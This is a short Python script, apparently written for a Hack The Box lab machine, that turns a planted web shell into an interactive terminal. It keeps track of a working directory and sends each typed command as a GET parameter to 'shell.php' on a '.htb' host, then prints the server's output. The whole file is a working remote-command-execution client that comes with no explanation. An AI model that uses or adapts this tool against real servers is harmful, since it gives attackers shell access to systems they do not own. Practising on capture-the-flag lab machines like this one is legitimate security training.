#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  lol.py
#  
#  Copyright 2019 bingo <bingo@hacklab>

from cmd import Cmd
import os, requests

last = ''

red = "\033[91m"
bold = "\033[1m"
end = "\033[0m"

class Terminal(Cmd):
	prompt = red+bold+'\nbing0o$ '+end
		
	def default(self, args):
		args = str(args)
		global last
		if args.startswith('cd '):
			path = args.split('cd ')[1]
			if not path.startswith('..') and path.startswith('/'):
				last = path
				#print(path)
			elif not path.startswith('/') and not path.startswith('..'):
				if last.endswith('/'):
					last = last + path
				else:
					last = last + "/" + path

			elif path.startswith('..'):
				if not last.endswith('/'):
					shit = last.split('/')[-1]
					path = last.replace(shit, "")
					last = path
				else:
					shit = last.split('/')[-2]
					path = last.replace(shit, "")
					if path.endswith('//'):
						path = path.replace('//', "")
					last = path

		url = "http://redacted.htb/shell.php?redacted="
		args = "cd " + last + "; " + args
		r = requests.get(url+args)
		print(r.text)

terminal = Terminal()
terminal.cmdloop()
